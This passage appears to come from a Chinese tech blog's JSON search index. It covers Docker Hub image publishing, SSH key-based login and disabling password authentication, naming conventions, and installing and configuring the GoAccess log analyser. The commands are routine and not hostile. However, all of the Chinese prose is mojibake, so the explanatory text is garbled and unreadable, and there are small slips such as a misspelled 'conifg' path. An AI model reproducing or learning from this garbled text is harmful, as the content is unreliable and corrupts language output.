å”¯ä¸€éœ€è¦æ³¨æ„çš„å°±æ˜¯æœ€åä¸€è¡Œï¼Œå¦‚æœæƒ³è¦ä½¿ç”¨å®˜æ–¹æœ€æ–°ç‰ˆæœ¬çš„ adminer ï¼Œé‚£å°±ç›´æ¥å†™æˆ adminerï¼Œä½†å¦‚æœæƒ³è¦ä½¿ç”¨è‡ªå·±çš„é•œåƒï¼Œé‚£å°±éœ€è¦å†™æˆ username/repo:tagname çš„æ ¼å¼ã€‚ æŸ¥çœ‹æœ¬åœ°æ‰€æœ‰é•œåƒï¼š 12$ docker imageshoooliday&#x2F;runfast adminer c3588b6003bb 3 weeks ago 90.4MB æ­¤æŒå°±å®Œæˆäº†Docker é•œåƒçš„å‘å¸ƒå’Œæ‹‰å–äº†ï¼Œå½“ç„¶è¿™åªæ˜¯ Docker Hub æ‰€æœ‰åŠŸèƒ½ä¸­çš„å†°å±±ä¸€è§’ã€‚","categories":[{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/categories/Docker/"},{"name":"Tutorial","slug":"Docker/Tutorial","permalink":"https://www.0x2beace.com/categories/Docker/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/tags/Docker/"},{"name":"Docker Hub","slug":"Docker-Hub","permalink":"https://www.0x2beace.com/tags/Docker-Hub/"}]},{"title":"Linux å¦‚ä½•ç”Ÿæˆå¯†é’¥å¯¹è¿›è¡Œ ssh å…å¯†ç™»å½•","slug":"how-to-generate-a-key-pair-for-ssh-login-without-password","date":"2020-08-29T03:46:41.000Z","updated":"2020-08-29T03:47:53.463Z","comments":true,"path":"how-to-generate-a-key-pair-for-ssh-login-without-password/","link":"","permalink":"https://www.0x2beace.com/how-to-generate-a-key-pair-for-ssh-login-without-password/","excerpt":"æœ€è¿‘å› ä¸ºé¡¹ç›®å¿«è¦ä¸Šçº¿äº†ï¼ŒæœåŠ¡å™¨ä»æµ‹è¯•ç¯å¢ƒè½¬åˆ°äº†ç”Ÿäº§ç¯å¢ƒï¼Œç™»å½•æ–¹å¼ä¹Ÿä»åŸæ¥çš„å¯†ç è®¤è¯æ›¿æ¢æˆäº†å¯†é’¥è®¤è¯ã€‚","text":"æœ€è¿‘å› ä¸ºé¡¹ç›®å¿«è¦ä¸Šçº¿äº†ï¼ŒæœåŠ¡å™¨ä»æµ‹è¯•ç¯å¢ƒè½¬åˆ°äº†ç”Ÿäº§ç¯å¢ƒï¼Œç™»å½•æ–¹å¼ä¹Ÿä»åŸæ¥çš„å¯†ç è®¤è¯æ›¿æ¢æˆäº†å¯†é’¥è®¤è¯ã€‚ è¿™ä¹ˆåšçš„ç›®çš„æ˜¯ä¸ºäº†é˜²æ­¢æœåŠ¡å™¨å¯†ç è¢«æš´åŠ›ç ´è§£ã€‚ ssh æ˜¯ä»€ä¹ˆï¼Ÿ ssh æ˜¯ä¸€ç§åè®®ï¼Œå®ƒå¯ä»¥åŸºäºå¯†ç è¿›è¡Œè®¤è¯ï¼Œä¹Ÿå¯ä»¥åŸºäºå¯†é’¥å»è®¤è¯ç”¨æˆ·ã€‚ ç”Ÿæˆå¯†é’¥å¯¹è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ RSA ç±»å‹çš„åŠ å¯†ç±»å‹æ¥åˆ›å»ºå¯†é’¥å¯¹ã€‚ 1ssh-keygen -f ~&#x2F;.ssh&#x2F;your_key_name -f å‚æ•°è¡¨ç¤ºæŒ‡å®šå¯†é’¥å¯¹ç”Ÿæˆä½ç½®ä¸åç§° å¯†é’¥å¯¹é€šå¸¸æ”¾åœ¨ $HOME/.ssh ç›®å½•ä¸‹ å›è½¦å³å¯åˆ›å»ºå¯†é’¥å¯¹ï¼Œå¦‚æœä¸éœ€è¦ä¸ºå¯†é’¥å¯¹è¿›è¡ŒåŠ å¯†ï¼Œé‚£ä¹ˆå¯ä»¥ä¸€è·¯å›è½¦ã€‚ åˆ›å»ºæˆåŠŸä¹‹åï¼Œå¯ä»¥çœ‹åˆ° .ssh ç›®å½•ä¸‹å¤šäº†ä¸¤ä¸ªæ–‡ä»¶ï¼Œåˆ†åˆ«æ˜¯ï¼š your_keyï¼šå¯†é’¥å¯¹çš„ç§é’¥ï¼Œé€šå¸¸æ”¾åœ¨å®¢æˆ·ç«¯ã€‚ your_key.pubï¼šå¯†é’¥å¯¹ä¸­çš„å…¬é’¥ï¼Œé€šå¸¸æ”¾åœ¨æœåŠ¡ç«¯ã€‚ å°†æœ¬åœ°çš„å…¬é’¥ä¼ åˆ°æœåŠ¡å™¨ä¸Šæ³¨æ„ï¼šè¿™é‡Œæ˜¯å°†your_key.pub å…¬é’¥æ–‡ä»¶ä¸Šä¼ è‡³ä½ éœ€è¦è¿æ¥çš„æœåŠ¡å™¨ï¼Œè€Œä¸æ˜¯your_keyç§é’¥æ–‡ä»¶ã€‚ 1ssh-copy-id -i ~&#x2F;.ssh&#x2F;your_key.pub user@&lt;ip address&gt; -pport -i å‚æ•°è¡¨ç¤ºä½¿ç”¨æŒ‡å®šçš„å¯†é’¥ï¼Œ-på‚æ•°è¡¨ç¤ºæŒ‡å®šç«¯å£ï¼Œssh çš„é»˜è®¤ç«¯å£æ˜¯ 22ï¼Œå¦‚æœæ²¡æœ‰æ›´æ”¹é»˜è®¤ç«¯å£ï¼Œåˆ™å¯ä»¥çœç•¥ã€‚ è¿™é‡Œéœ€è¦è¾“å…¥ä¸€æ¬¡å¯†ç è¿›è¡Œç¡®è®¤ï¼Œå¦‚æœæˆåŠŸä¹‹åï¼Œä¼šçœ‹åˆ°ä»¥ä¸‹å†…å®¹ï¼š æœ¬åœ°çš„å…¬é’¥æ–‡ä»¶ä¸Šä¼ åœ¨æœåŠ¡å™¨çš„å“ªé‡Œï¼Ÿ åœ¨è¯¥ç”¨æˆ·çš„.ssh/authorized_keys æ–‡ä»¶ä¸­ã€‚ 1cat ~&#x2F;.ssh&#x2F;authorized_keys é€šè¿‡å¯†é’¥å¯¹è¿›è¡Œå…å¯†ç™»å½•ç°åœ¨æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ç™»å½•åˆ°æœåŠ¡å™¨ä¸­äº†ï¼š 1ssh -p port -i ~&#x2F;.ssh&#x2F;your_key user@&lt;ip address&gt; ä¸å‡ºæ„å¤–ï¼Œå°±å¯ä»¥ä¸ç”¨è¾“å…¥å¯†ç è€Œç›´æ¥æˆåŠŸç™»å½•äº†ã€‚ å¦‚æœä½ ä»ç„¶éœ€è¦è¾“å…¥å¯†ç æˆ–è€…é‡åˆ°å…¶ä»–é—®é¢˜äº†ï¼Œå¯ä»¥ä»ä»¥ä¸‹æ–¹å‘è¿›è¡Œæ’æŸ¥ã€‚ å¸¸è§é—®é¢˜ï¼š å¦‚æœæ²¡æœ‰ä½¿ç”¨é»˜è®¤çš„å¯†é’¥åç§°ï¼ˆid_rsaï¼‰ï¼Œåˆ™åœ¨è¿æ¥ä¸»æœºæ—¶éœ€è¦åŠ ä¸Š-i å‚æ•°ï¼ŒæŒ‡å®šå¯¹åº”å¯†é’¥çš„åç§°ã€‚å¦åˆ™ç”±äºé»˜è®¤ç§é’¥ä¸è¿œç¨‹ä¸»æœºä¸­çš„è‡ªå®šä¹‰å…¬é’¥ä¸åŒ¹é…ï¼Œè‡ªç„¶æ— æ³•åŸºäºå¯†é’¥è¿›è¡Œè®¤è¯ï¼Œä¼šå†æ¬¡æç¤ºä½ è¾“å…¥å¯†ç ã€‚ æœåŠ¡ç«¯çš„$HOME/.sshç›®å½•çš„æ­£å¸¸æƒé™æ˜¯700ï¼ŒæœåŠ¡ç«¯$HOME/.ssh/authorized_keysæ–‡ä»¶çš„æƒé™é»˜è®¤ä¸º600ã€‚ ä¸Šä¼ å¯†é’¥æ—¶ä½¿ç”¨çš„æ˜¯ï¼šå…¬é’¥ï¼ˆ.pubï¼‰ï¼Œè¿›è¡Œå¯†é’¥è®¤è¯æ—¶ä½¿ç”¨çš„æ˜¯ï¼šç§é’¥ã€‚ é…ç½®ssh configä¸Šé¢çš„å‘½ä»¤è™½ç„¶å¯ä»¥å®ç°å…å¯†ç™»å½•ï¼Œä½†æ˜¯å‘½ä»¤å¤ªé•¿äº†ï¼Œå°±ç®—æ˜¯å¤åˆ¶ç²˜è´´ä¹Ÿæœ‰å¯èƒ½ä¼šå‡ºé”™ã€‚ é‚£æœ‰æ²¡æœ‰ä»€ä¹ˆå¥½çš„åŠæ³•ï¼Œè§£å†³è¿™ä¸ªé—®é¢˜å‘¢ï¼Ÿ å½“ç„¶æ˜¯æœ‰çš„å•¦ã€‚ åœ¨$HOME/.ssh ç›®å½•ä¸‹ï¼Œåˆ›å»ºä¸€ä¸ªåä¸ºconfigçš„æ–‡ä»¶ã€‚ 1vim $HOME&#x2F;.ssh&#x2F;conifg åŠ å…¥ä»¥ä¸‹é…ç½®ï¼š 123456Host alias User user HostName ip address Port port IdentityFile ~&#x2F;.ssh&#x2F;your_key ServerAliveInterval 360 å‚æ•°è¯´æ˜ï¼š Hostï¼šå¯ä»¥ç†è§£æˆåˆ«åï¼Œé…ç½®å®Œæˆä¹‹åï¼Œæœ€åå°±é€šè¿‡ ssh alias è¿›è¡Œç™»å½•ã€‚ Userï¼šè¿œç¨‹ä¸»æœºçš„ç”¨æˆ·åç§° HostNameï¼šè¿œç¨‹ä¸»æœºçš„åœ°å€ Portï¼šç«¯å£å· IdentityFileï¼šç§é’¥æ–‡ä»¶çš„è·¯å¾„ ServerAliveIntervalï¼šä¿æŒå®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯ä¼šè¯åœ¨çŸ­æ—¶é—´å†…ä¸ä¼šæ–­å¼€ã€‚ å½“ç„¶ï¼Œå¦‚æœä½ æ˜¯ä½¿ç”¨ssh å®¢æˆ·ç«¯ï¼Œé‚£å°±ä¸ç”¨é…ç½®è¿™äº›ã€‚ ç¦ç”¨é€šè¿‡å¯†ç è®¤è¯å¦‚æœä¸Šé¢çš„é…ç½®éƒ½æ— è¯¯ï¼Œå¯ä»¥æ­£å¸¸é€šè¿‡å¯†é’¥è¿›è¡Œå…å¯†ç™»å½•ï¼Œé‚£ä¹ˆæœ€åéœ€è¦åšçš„ä¸€ä»¶äº‹æƒ…å°±æ˜¯å…³é—­æœåŠ¡ç«¯çš„é€šè¿‡å¯†ç è¿›è¡Œèº«ä»½è®¤è¯ã€‚ 1234vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config# å°†yes æ”¹ä¸º noPasswordAuthentication yes ç„¶åé‡å¯ sshd æœåŠ¡ã€‚ 1service sshd restart ä»¥ä¸Šå°±æ˜¯æœ‰å…³å¦‚ä½•ç”¨è‡ªå®šä¹‰çš„å¯†é’¥å¯¹è¿›è¡Œå…å¯†è®¤è¯çš„å…¨éƒ¨è¿‡ç¨‹äº†ã€‚","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"SSH","slug":"SSH","permalink":"https://www.0x2beace.com/tags/SSH/"},{"name":"SSHD","slug":"SSHD","permalink":"https://www.0x2beace.com/tags/SSHD/"}]},{"title":"å‘½åè§„èŒƒâ€”â€”ç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»","slug":"naming-convention-programmer-s-self-cultivation","date":"2020-08-28T13:36:57.000Z","updated":"2020-08-28T13:40:17.879Z","comments":true,"path":"naming-convention-programmer-s-self-cultivation/","link":"","permalink":"https://www.0x2beace.com/naming-convention-programmer-s-self-cultivation/","excerpt":"ä¹‹æ‰€ä»¥ä¼šæœ‰è¿™æ ·ä¸€ç¯‡ç¬”è®°å‘¢ï¼Œæ˜¯å› ä¸ºåœ¨å„ç§ä¸åŒçš„åœºæ™¯ä¸‹ï¼Œé¢ä¸´å‘½åè¿™ä»¶äº‹æƒ…ï¼Œæœ‰æ—¶å€™ä¼šçŠ¯è¿·ç³Šï¼Œä¸çŸ¥é“è¯¥å¦‚ä½•é€‰æ‹©æ­£ç¡®çš„æ–¹å¼å‘½åã€‚æ‰€ä»¥è¿™ç¯‡ç¬”è®°çš„ç›®çš„å°±æ˜¯ä¸ºè§£å†³è¿™ä¸ªé—®é¢˜ã€‚","text":"ä¹‹æ‰€ä»¥ä¼šæœ‰è¿™æ ·ä¸€ç¯‡ç¬”è®°å‘¢ï¼Œæ˜¯å› ä¸ºåœ¨å„ç§ä¸åŒçš„åœºæ™¯ä¸‹ï¼Œé¢ä¸´å‘½åè¿™ä»¶äº‹æƒ…ï¼Œæœ‰æ—¶å€™ä¼šçŠ¯è¿·ç³Šï¼Œä¸çŸ¥é“è¯¥å¦‚ä½•é€‰æ‹©æ­£ç¡®çš„æ–¹å¼å‘½åã€‚æ‰€ä»¥è¿™ç¯‡ç¬”è®°çš„ç›®çš„å°±æ˜¯ä¸ºè§£å†³è¿™ä¸ªé—®é¢˜ã€‚ å‘½åè§„èŒƒå‘½åè§„èŒƒåŒ…å«äº†ï¼šç›®å½•ã€æ–‡ä»¶ã€å˜é‡ã€å‡½æ•°å‘½åã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼šå‘½åè§„åˆ™æ²¡æœ‰è°å¯¹è°é”™ï¼Œåœ¨é¡¹ç›®ä¸­ä¿æŒä¸€è‡´æ‰æ˜¯å…³é”®ã€‚ æ··ä¹±æˆ–é”™è¯¯çš„å‘½åä¸ä»…è®©æˆ‘ä»¬å¯¹ä»£ç éš¾ä»¥ç†è§£ï¼Œæ›´ç³Ÿç³•çš„æ˜¯ï¼Œä¼šè¯¯å¯¼æˆ‘ä»¬çš„æ€ç»´ï¼Œå¯¼è‡´å¯¹ä»£ç çš„ç†è§£å®Œå…¨é”™è¯¯ã€‚ç›¸åï¼Œè‰¯å¥½çš„å‘½åï¼Œåˆ™å¯ä»¥è®©æˆ‘ä»¬çš„ä»£ç éå¸¸å®¹æ˜“è¯»æ‡‚ï¼Œä¹Ÿèƒ½å‘è¯»è€…æ­£ç¡®è¡¨è¾¾äº‹ç‰©ä»¥åŠé€»è¾‘çš„æœ¬è´¨ï¼Œä»è€Œä½¿å¾—ä»£ç çš„å¯ç»´æŠ¤æ€§å°±å¤§å¤§å¢å¼ºï¼Œè¯»å‘½åå¥½çš„æ–‡ç« æ˜¯éå¸¸æµç•…çš„ï¼Œä¼šæœ‰ä¸€ç§äº«å—çš„æ„Ÿè§‰ã€‚ ç›®å½•å› ä¸ºWindowsï¼ŒOSX ä¸‹æ–‡ä»¶å¤¹ä¸åŒºåˆ†å¤§å°å†™ï¼ŒLinux æ˜¯åŒºåˆ†çš„ã€‚æ‰€ä»¥åœ¨æ–‡ä»¶å¤¹çš„å‘½åä¸Šé¢ï¼Œå»ºè®®å…¨éƒ¨ç”¨å°å†™ã€‚å¯ä»¥åŒ…å«ä¸‹åˆ’çº¿(_)æˆ–è¿å­—ç¬¦(-)ã€‚å¦‚æœæ²¡æœ‰çº¦å®šï¼Œ(_)æ›´å¥½ã€‚ æ–‡ä»¶æ–‡ä»¶çš„å‘½åä¹Ÿæ˜¯æ¨èå’Œç›®å½•çš„è¿å­—ç¬¦ä¿æŒä¸€è‡´ã€‚Linux æ–‡ä»¶ç³»ç»Ÿæ¨èçš„æ–‡ä»¶å‘½åæ˜¯ä¸‹åˆ’çº¿(_)ã€‚ ç±»ç±»å‹åç§°é€šå¸¸ä½¿ç”¨å¤§å†™é©¼å³°å‘½åæ³• 12class MyClass ... ç±»æˆå‘˜ä¸ç®¡æ˜¯é™æ€è¿˜æ˜¯éé™æ€ï¼Œç±»æ•°æ®æˆå‘˜çš„å‘½åéƒ½å¯ä»¥å’Œæ™®é€šå˜é‡ä¸€æ ·ï¼Œé‡‡ç”¨é©¼å³°å‘½åæ³•ï¼š 123456789class MyClass &#123; public $myVariable; public static $myStaticVariable; public function myFunction($firstWord, $secondWord)&#123; &#x2F;&#x2F;æ–¹æ³•ä¸­çš„å‚æ•°åæ¨èä½¿ç”¨å°é©¼å³°å‘½åæ³• ... &#125;;&#125; ä¸€èˆ¬åç§°çš„å‰ç¼€éƒ½æ˜¯æœ‰ç¬¬ä¸€è§„å¾‹çš„ï¼Œå¦‚isï¼ˆåˆ¤æ–­ï¼‰ã€getï¼ˆå¾—åˆ°ï¼‰ï¼Œsetï¼ˆè®¾ç½®ï¼‰ã€‚ å˜é‡å˜é‡çš„å‘½åæœ‰ä¸¤ç§æ–¹å¼ï¼š ä¸‹åˆ’çº¿å‘½åæ³•ï¼šmy_variable å°é©¼å³°å‘½åæ³•ï¼šmyVariable ä½†é€šå¸¸è¿˜æ˜¯æ¨èä½¿ç”¨ï¼Œä¸‹åˆ’çº¿å‘½åæ³•ï¼ˆå…¨æ˜¯å°å†™ï¼‰ã€‚ ä¸åŒçš„è¯­è¨€ä¹Ÿæ˜¯æœ‰ä¸åŒçš„è§„èŒƒï¼Œä¾‹å¦‚JavaScript å˜é‡æ¨èé©¼å³°å‘½åæ³•ï¼ŒCSS æ¨èè¿å­—ç¬¦(-)ã€‚ å¸¸é‡ã€å…¨å±€å¸¸é‡å¸¸é‡å’Œå…¨å±€å¸¸é‡é€šå¸¸ä½¿ç”¨å…¨å¤§å†™å’Œä¸‹åˆ’çº¿çš„æ–¹å¼æ¥å‘½åï¼Œä¾‹å¦‚ï¼š 12const MY_CONSTANT;define(&quot;DEFAULT_NUM&quot;, 10); ç‰¹æ®Šå˜é‡12345&#x2F;&#x2F;å¼•ç”¨å˜é‡&#x2F;&#x2F;é™æ€å˜é‡&#x2F;&#x2F;å…¨å±€å˜é‡ å‡½æ•°å‘½åå‡½æ•°çš„å‘½åä½¿ç”¨ä¸‹åˆ’çº¿å‘½åæ³•ï¼š 123function my_function()&#123; ...&#125; è¡¥å……è¯´æ˜å‡½æ•°å’Œæ–¹æ³•çš„åŒºåˆ«ï¼šå‡½æ•°æ˜¯ä¸€æ®µå¯ä»¥é‡ç”¨çš„ä»£ç å—ï¼Œæ–¹æ³•æ˜¯åœ¨ç±»é‡Œé¢çš„å‡½æ•°ã€‚ å‚è€ƒé“¾æ¥ï¼š PHP å‘½åè§„èŒƒ å¦‚ä½•ä¼˜é›…çš„ä¸ºå˜é‡å’Œå‡½æ•°å‘½å å‘½åçº¦å®š | Googleå¼€æºé¡¹ç›®é£æ ¼æŒ‡å— å‘½åè§„èŒƒ | ç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»","categories":[{"name":"ç¢ç¢å¿µ","slug":"ç¢ç¢å¿µ","permalink":"https://www.0x2beace.com/categories/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"}],"tags":[{"name":"ç¢ç¢å¿µ","slug":"ç¢ç¢å¿µ","permalink":"https://www.0x2beace.com/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"}]},{"title":"æ—¥å¿—åˆ†æå·¥å…· - GoAccess","slug":"log-analysis-tool-goaccess","date":"2020-08-27T14:59:41.000Z","updated":"2020-11-09T00:28:06.901Z","comments":true,"path":"log-analysis-tool-goaccess/","link":"","permalink":"https://www.0x2beace.com/log-analysis-tool-goaccess/","excerpt":"æ—¥å¿—çš„é‡è¦æ€§ä¸è¨€è€Œå–»ï¼Œå¯æˆ‘ä¼¼ä¹å®Œå…¨å¿½ç•¥äº†å®ƒï¼Œå¯¼è‡´å¾€å¾€å‡ºç°ä»€ä¹ˆé—®é¢˜ï¼Œç¬¬ä¸€æ—¶é—´å¹¶ä¸æ˜¯å»çœ‹æ—¥å¿—ã€‚","text":"æ—¥å¿—çš„é‡è¦æ€§ä¸è¨€è€Œå–»ï¼Œå¯æˆ‘ä¼¼ä¹å®Œå…¨å¿½ç•¥äº†å®ƒï¼Œå¯¼è‡´å¾€å¾€å‡ºç°ä»€ä¹ˆé—®é¢˜ï¼Œç¬¬ä¸€æ—¶é—´å¹¶ä¸æ˜¯å»çœ‹æ—¥å¿—ã€‚ å¾ˆæ˜¾ç„¶æˆ‘å®Œå…¨å¿½è§†äº†å®ƒçš„å¼ºå¤§æ€§ï¼Œå°±æ‹¿ nginx çš„è®¿é—®æ—¥å¿—æ¥è¯´ï¼Œå¯ä»¥ä»ä¸­åˆ†æå‡ºå¦‚ä¸‹ä¿¡æ¯ï¼š è¯·æ±‚çš„å“åº”æ—¶é—´ è¯·æ±‚è¾¾åˆ°çš„åç«¯æœåŠ¡å™¨çš„åœ°å€å’Œç«¯å£ è¯·æ±‚æ˜¯å¦å­˜åœ¨ç¼“å­˜é…ç½® è¯·æ±‚ä½“ã€è¯·æ±‚å¤´ã€å“åº”ä½“å’Œå“åº”å¤´çš„å¤§å°ç­‰ å®¢æˆ·ç«¯çš„IP åœ°å€ã€UserAgent ç­‰ä¿¡æ¯ è‡ªå®šä¹‰å˜é‡çš„å†…å®¹ é€šè¿‡è¿™äº›ä¿¡æ¯ï¼Œå¯ä»¥å¾—åˆ°å“åº”è€—æ—¶çš„è¯·æ±‚ä»¥åŠè¯·æ±‚é‡å’Œå¹¶å‘é‡ï¼Œä»è€Œåˆ†æå¹¶å‘åŸå› ï¼Œè¿™å¯¹äºåº”ç”¨çº§åˆ«çš„æœåŠ¡æ¥è¯´æ˜¯éå¸¸é‡è¦çš„ã€‚ GoAccess æ˜¯ä»€ä¹ˆGoAccess æ˜¯ä¸€ä¸ªå¼€æºçš„å®æ—¶ç½‘ç»œæ—¥å¿—åˆ†æå™¨å’Œäº¤äº’å¼æŸ¥çœ‹å™¨ï¼Œå¯ä»¥åœ¨ç±» Unix ç³»ç»Ÿä¸­çš„ç»ˆç«¯æˆ–é€šè¿‡æµè§ˆå™¨è¿è¡Œã€‚ â€”â€” GoAccess å®˜æ–¹ ä¸ºä»€ä¹ˆé€‰æ‹© GoAccessï¼Ÿ å› ä¸ºGoAccess è¢«è®¾è®¡æˆä¸€ä¸ªåŸºäºç»ˆç«¯çš„å¿«é€Ÿæ—¥å¿—åˆ†æå™¨ã€‚å®ƒçš„æ ¸å¿ƒæ€æƒ³æ˜¯å®æ—¶å¿«é€Ÿåˆ†æå’ŒæŸ¥çœ‹WebæœåŠ¡å™¨ç»Ÿè®¡ä¿¡æ¯ï¼Œè€Œæ— éœ€ä½¿ç”¨æµè§ˆå™¨ã€‚åŒæ—¶ä¹Ÿå¯ä»¥å°†è¾“å…¥åˆ°HTML æˆ–è€… CSVã€JSONã€‚ GoAccesså‡ ä¹å¯ä»¥è§£æä»»ä½•Webæ—¥å¿—æ ¼å¼ï¼ˆApacheï¼ŒNginxï¼ŒAmazon S3ï¼ŒElastic Load Balancingï¼ŒCloudFrontç­‰ï¼‰ã€‚åªéœ€è¦è®¾ç½®æ—¥å¿—æ ¼å¼å¹¶æ ¹æ®æ‚¨çš„æ—¥å¿—è¿è¡Œå®ƒã€‚ GoAccess å…¥é—¨æ˜¨å¤©åœ¨ä½¿ç”¨ GoAccess æ—¶ï¼Œè¸©åˆ°äº†ä¸€äº›å‘ï¼Œå¯¼è‡´æˆ‘ä¸€åº¦è®¤ä¸ºè¿™ä¸ªå·¥å…·æ˜¯ä¸æ˜¯å­˜åœ¨ä»€ä¹ˆBugã€‚å› ä¸ºåœ¨çœ‹åˆ«äººçš„æ•™ç¨‹ä¸­éƒ½æ˜¯å¼€ç®±å³ç”¨ã€‚ ä¸‹é¢ä»å®‰è£…åˆ°ä½¿ç”¨ä¼šä¸€ä¸€è¯¦ç»†è¯´æ˜ã€‚ å®‰è£… GoAccesså› ä¸ºæœåŠ¡å™¨çš„æ“ä½œç³»ç»Ÿæ˜¯ Ubuntuï¼Œæ‰€ä»¥è¿™é‡Œä»¥ Ubuntuä¸ºä¾‹ï¼š å› ä¸ºå¹¶éæ‰€æœ‰å‘è¡Œç‰ˆéƒ½æä¾›æœ€æ–°ç‰ˆæœ¬çš„ GoAccessï¼Œæ‰€ä»¥è¿™é‡Œä½¿ç”¨å®˜æ–¹æä¾›çš„æœ€æ–°ç¨³å®šç‰ˆçš„å®‰è£…æ–¹å¼ 1234$ echo &quot;deb http:&#x2F;&#x2F;deb.goaccess.io&#x2F; $ï¼ˆlsb_release -csï¼‰main&quot; | sudo tee -a &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;goaccess.list$ wget -O - https:&#x2F;&#x2F;deb.goaccess.io&#x2F;gnugpg.key | sudo apt-key add - $ sudo apt-get update$ sudo apt-get install goaccess ç¡®å®šæ—¥å¿—æ ¼å¼åœ¨è®¡ç®—æœºå®‰è£…äº†GoAccess ä¹‹åï¼Œè¦åšçš„ç¬¬ä¸€ä»¶äº‹æƒ…å°±æ˜¯ç¡®å®šè®¿é—®æ—¥å¿—çš„æ—¥å¿—æ ¼å¼ï¼Œå¯ä»¥åœ¨æ°¸ä¹…è®¾ç½®å®ƒä»¬ï¼Œä¹Ÿå¯ä»¥é€šè¿‡å‘½ä»¤è¡Œä¼ é€’ä»–ä»¬ã€‚ è¿™é‡Œç”¨Nginx çš„ access.log ä¸ºä¾‹ 136.113.128.155 - - [28&#x2F;Apr&#x2F;2019:02:20:01 +0000] &quot;GET &#x2F;Manage&#x2F;Dingdan&#x2F;fail_index&#x2F;startTime&#x2F;2019-04-28+00%3A00%3A00&#x2F;endTime&#x2F;2019-04-28+23%3A59%3A59.html HTTP&#x2F;1.1&quot; 200 7798 &quot;http:&#x2F;&#x2F;www.692213.com&#x2F;Manage&#x2F;Dingdan&#x2F;fail_index&#x2F;startTime&#x2F;2019-04-28+00%3A00%3A00&#x2F;endTime&#x2F;2019-04-28+23%3A59%3A59.html&quot; &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;70.0.3538.110 Safari&#x2F;537.36&quot; æ–¹å¼ä¸€ï¼Œé…ç½®.goaccessrcæ–‡ä»¶ï¼š 12345vim ~&#x2F;.goaccessrctime-format %Tdate-format %d&#x2F;%b&#x2F;%Ylog_format %h %^[%d:%t %^] &quot;%r&quot; %s %b &quot;%R&quot; &quot;%u&quot; %^ æ–¹å¼äºŒï¼Œåœ¨å‘½ä»¤è¡Œä¼ é€’å‚æ•°ï¼š 1$ goaccess nginx&#x2F;access.log --log-format&#x3D;&#39;%h %^[%d:%t %^] &quot;%r&quot; %s %b &quot;%R&quot; &quot;%u&quot; %^&#39; --date-format&#x3D;%d&#x2F;%b&#x2F;%Y --time-format&#x3D;%T æ³¨æ„ï¼šæ— è®ºæ˜¯é…ç½®æ–‡ä»¶è¿˜æ˜¯å‘½ä»¤è¡Œå‚æ•° éƒ½ä¸æ˜¯æ°¸è¿œä¸å˜çš„ï¼Œåªæ˜¯ç›¸å¯¹äºä½ è¦ç›‘æ§çš„æ—¥å¿—æ ¼å¼ã€‚ è¿è¡ŒGoAccessæ–¹å¼ä¸€ï¼Œé€šè¿‡-på‚æ•°ï¼ŒæŒ‡å®šé…ç½®æ–‡ä»¶ã€‚ 1$ goaccess nginx&#x2F;access.log -p ~&#x2F;.goaccessrc æ–¹å¼äºŒï¼Œç›´æ¥åœ¨å‘½ä»¤è¡Œå‚æ•°ä¸­æŒ‡å®šæ—¥å¿—æ ¼å¼ï¼Œè¯¦æƒ…è§ä¸Šé¢çš„ä¾‹å­ã€‚ ç»ˆç«¯è¾“å‡ºä»¥ä¸‹æç¤ºä½¿ç”¨é¢„å®šä¹‰æ—¥å¿—æ ¼å¼çš„æ—¥å¿—é…ç½®å¯¹è¯æ¡†ä¾›æ‚¨é€‰æ‹©ï¼Œç„¶åå®æ—¶æ˜¾ç¤ºç»Ÿè®¡ä¿¡æ¯ã€‚ 1$ goaccess nginx&#x2F;access.log -c é€šå¸¸é€‰æ‹©ç¬¬ä¸‰ä¸ªï¼Œé€šç”¨æ—¥å¿—æ ¼å¼ï¼ˆCLFï¼‰ï¼ŒæˆåŠŸä¹‹åå°±æ˜¯è¿™æ ·ä¸ªæ ·å­ï¼š æ§åˆ¶å°ä¸‹çš„æ“ä½œæ–¹æ³•ï¼š 1234567891011121314151617* F1æˆ–hä¸»è¦å¸®åŠ©ã€‚* F5é‡ç»˜ä¸»çª—å£ã€‚* qé€€å‡ºç¨‹åºï¼Œå½“å‰çª—å£æˆ–æŠ˜å æ´»åŠ¨æ¨¡å—* oæˆ–ENTERå±•å¼€æ‰€é€‰æ¨¡å—æˆ–æ‰“å¼€çª—å£* 0-9å¹¶å°†Shift + 0æ‰€é€‰æ¨¡å—è®¾ç½®ä¸ºæ´»åŠ¨çŠ¶æ€* jåœ¨å±•å¼€çš„æ¨¡å—ä¸­å‘ä¸‹æ»šåŠ¨* kåœ¨æ‰©å±•æ¨¡å—ä¸­å‘ä¸Šæ»šåŠ¨* cè®¾ç½®æˆ–æ›´æ”¹æ–¹æ¡ˆé¢œè‰²* ^ fåœ¨æ´»åŠ¨æ¨¡å—ä¸­å‘å‰æ»šåŠ¨ä¸€ä¸ªå±å¹•* ^ båœ¨æ´»åŠ¨æ¨¡å—ä¸­å‘åæ»šåŠ¨ä¸€ä¸ªå±å¹•* TABè¿­ä»£æ¨¡å—ï¼ˆè½¬å‘ï¼‰* SHIFT + TABè¿­ä»£æ¨¡å—ï¼ˆå‘åï¼‰* så¯¹æ´»åŠ¨æ¨¡å—çš„æ’åºé€‰é¡¹* &#x2F;æœç´¢æ‰€æœ‰æ¨¡å—ï¼ˆå…è®¸æ­£åˆ™è¡¨è¾¾å¼ï¼‰* næ‰¾åˆ°ä¸‹ä¸€ä¸ªå‡ºç°çš„ä½ç½®* gç§»è‡³å±å¹•çš„ç¬¬ä¸€ä¸ªé¡¹ç›®æˆ–é¡¶éƒ¨* 